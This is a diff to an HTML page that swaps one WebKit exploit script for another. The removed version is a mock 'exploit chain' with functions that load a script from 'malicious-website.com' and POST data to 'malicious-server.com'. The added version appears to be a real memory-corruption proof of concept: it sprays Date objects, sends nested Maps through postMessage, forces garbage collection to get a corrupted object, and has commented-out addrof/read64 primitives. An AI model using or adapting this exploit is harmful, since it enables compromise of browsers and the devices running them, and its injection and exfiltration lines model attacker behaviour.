@@ -33,189 +33,95 @@
 
 <div id="log"></div>
 
-<script>
-document.addEventListener('DOMContentLoaded', function () {
-    const logElement = document.getElementById('log');
-    let logBuffer = [];
+//import { mem } from '/module/mem.mjs';
+import { debug_log } from '/module/utils.mjs';
 
-    function log(message) {
-        const timestamp = new Date().toISOString();
-        logBuffer.push(`[${timestamp}] ${message}`);
-        
-        // Update log every 20 messages
-        if (logBuffer.length >= 20) {
-            logElement.textContent += logBuffer.join("\n") + "\n";
-            logBuffer = [];
-            logElement.scrollTop = logElement.scrollHeight; // Scroll to bottom
-        }
-        console.log(message);
+export function sleep(ms=0) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function gc() {
+    new Uint8Array(4 * 1024 * 1024);
+}
+
+function spray() {
+    const tmp = [];
+    for (let j = 0; j < 1024; j++) {
+        const d = new Date(0xbeef);
+        tmp.push(d);
     }
+}
 
-    log("WebKit Exploit started.");
-
-    function waitForPayload() {
-        log("Waiting for ELF payload...");
-
-        // Simulate the waiting process, display the "waiting for payload" message
-        let payloadReceived = false;
-
-        // Simulate a timeout or fetch operation to "wait" for the payload
-        setInterval(() => {
-            // You can simulate the payload reception with a mock condition here
-            if (!payloadReceived) {
-                log("Still waiting for the ELF payload...");
-            }
-
-            // Simulate checking for the payload with mock success
-            if (Math.random() > 0.95) { // Simulate random success for testing
-                payloadReceived = true;
-                log("Payload received successfully.");
-            }
-        }, 5000); // Check every 5 seconds
+void async function main() {
+    const num_elems = 800;
+    let root = new Map();
+    let msg = root;
+    let foo = [];
+    for (let i = 0; i < 100; i++) {
+        foo.push(new Date(0xffff));
     }
-
-    function escalatePrivileges() {
-        log("Attempting privilege escalation.");
-        // No redirection code here anymore
-        log("Privilege escalation complete without redirection.");
+    for (let i = 0; i < num_elems; i++) {
+        const d = new Date(i);
+        const map = new Map();
+        msg.set(d, [map, foo]);
+        msg = map;
     }
+    msg = root;
 
-    function injectMaliciousCode() {
-        log("Injecting malicious code.");
-        const script = document.createElement("script");
-        script.src = "https://malicious-website.com/exploit.js";
-        document.body.appendChild(script);
-    }
-
-    function deliverPayload() {
-        log("Delivering payload to attacker server.");
-        fetch("https://malicious-server.com/payload", {
-            method: "POST",
-            body: JSON.stringify({ exploit: "data" }),
-            headers: { "Content-Type": "application/json" }
+    let data2 = null;
+    let idx = null;
+    loop: while (true) {
+        let data = null;
+        const prom = new Promise(resolve => {
+            addEventListener('message', event => {
+                data = event;
+                resolve();
+            }, {once: true});
         });
-    }
+        postMessage(msg, origin);
+        await prom;
+        data = data.data;
 
-    function exploitChain() {
-        // Check read/write privileges
-        const readSuccess = checkReadPrivilege();
-        const writeSuccess = checkWritePrivilege();
+        gc();
+        await sleep();
 
-        if (readSuccess && writeSuccess) {
-            log("Both read and write privileges are successfully exploited!");
-
-            // Leak sensitive data
-            leakSensitiveData();
-
-            // Escalate privileges by manipulating critical objects or actions
-            escalatePrivileges();
-
-            // Inject malicious code into the page
-            injectMaliciousCode();
-
-            // Persist exploit by storing data in localStorage
-            persistExploit();
-
-            // Deliver payload to attacker server
-            deliverPayload();
-        } else {
-            log("Read and/or write privileges failed. Exploit chain aborted.");
-        }
-    }
-
-    function checkReadPrivilege() {
-        let foo = 42;
-        let readSuccess = false;
-
-        class Leaker {
-            leak() {
-                try {
-                    const result = super.foo;  // Attempt to read
-                    readSuccess = result === 42;  // Check if we got the expected result
-                } catch (error) {
-                    log("Read privilege check failed.");
-                }
-                return readSuccess;
-            }
-        }
-
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            get(target, propertyName, receiver) {
-                if (propertyName === "foo") {
-                    return 42; // Fallback value for 'foo'
-                }
-                return receiver;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
-    }
-
-    function checkWritePrivilege() {
-        let writeSuccess = false;
-        let receiver;
-
-        class Leaker {
-            leak() {
-                try {
-                    super.foo = {};  // Attempt to write
-                    writeSuccess = true;
-                } catch (error) {
-                    log("Write privilege check failed.");
-                }
-                return writeSuccess;
-            }
-        }
-
-        Leaker.prototype.__proto__ = new Proxy({}, {
-            set(target, propertyName, value, __receiver) {
-                if (propertyName === "foo") {
-                    receiver = __receiver;
-                    return true; // Allow setting 'foo'
-                }
-                return false;
-            }
-        });
-
-        const { leak } = new Leaker();
-        return leak();
-    }
-
-    // Start waiting for the ELF payload
-    waitForPayload();
-
-    // Simulate the exploit chain running
-    exploitChain();
-
-    // Limit the number of iterations for debugging purposes
-    const MAX_ITERATIONS = 20; // Reduce the iterations for troubleshooting
-    function runIteration(i) {
-        if (i >= MAX_ITERATIONS) {
-            log("All iterations completed.");
-            return;
-        }
-
+        let tmp_i = null;
         try {
-            log(`Iteration ${i}: Starting attempt`);
-
-            exploitChain();
-
-            if (i % 10 === 0) {
-                log(`Iteration ${i} completed successfully.`);
+            for (let i = 0; i < num_elems; i++) {
+                tmp_i = i;
+                if (data.keys().next().value.getTime() === 0xffff) {
+                    idx = i;
+                    break loop;
+                }
+                data = data.values().next().value[0];
             }
-        } catch (error) {
-            log(`Error encountered at iteration ${i}: ${error.message}`);
+        } catch {
+            idx = tmp_i;
+            data2 = data.keys().next().value;
+            break loop;
         }
-
-        // Schedule next iteration with a delay
-        setTimeout(() => runIteration(i + 1), 100); // 100ms delay
     }
 
-    // Start the iteration process
-    runIteration(0);
-});
-</script>
+    // comment this out if you just want to crash
+    // import mem if you want to read the corrupted object
+    /*
+    debug_log('normal Date:');
+    const tmp_d = new Date();
+    const date_p = mem.addrof(tmp_d);
+    for (let i = 0; i < 8*8; i += 8) {
+        debug_log(date_p.read64(i));
+    }
+    debug_log('corrupted:');
+    const data_p = mem.addrof(data2);
+    for (let i = 0; i < 8*8; i += 8) {
+        debug_log(data_p.read64(i));
+    }
+    */
+
+    alert('try crash');
+    debug_log(data2);
+}();
+
 
 </body>
 </html>
